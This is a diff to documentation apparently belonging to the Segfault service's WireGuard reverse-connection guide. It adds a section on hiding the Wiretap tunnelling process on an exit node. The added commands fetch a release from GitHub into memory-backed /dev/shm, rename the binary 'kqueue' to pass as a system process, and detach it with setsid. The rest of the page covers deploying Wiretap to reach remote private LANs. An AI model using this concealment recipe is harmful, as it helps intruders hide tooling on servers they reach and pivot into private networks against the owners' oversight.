@@ -16,6 +16,16 @@ description: Segfault WireGuard Reverse Connection tricks.
 1. `curl rpc/net/show` may show that the interface is up but that no data has been transfered. It is likely that you have not started `wiretap` on the Exit Node yet or that Wiretap can not reach your Root Server.
 1. It is only possible to have 1 Interface up at a time. (if you like us to add multi-interface support then please contact us.)
 
+## Hide the Wiretap process
+
+```
+cd /dev/shm
+curl -fsSL https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_linux_amd64.tar.gz | tar xfz - -O >kqueue
+PATH=.:$PATH
+ulimit -n $(ulimit -Hn)  # Set max open files to hardlimit
+setsid kqueue server --private ...
+```
+
 ## Deploy Wiretap first
 
 It is possible to install [Wiretap](https://github.com/sandialabs/wiretap) on many many servers and only activate the Interface on your [Root Server](../) if and when needed. The Root Server does not need to know about the Wiretap installations until you like to access the remote private LAN from your [Root Server](../).
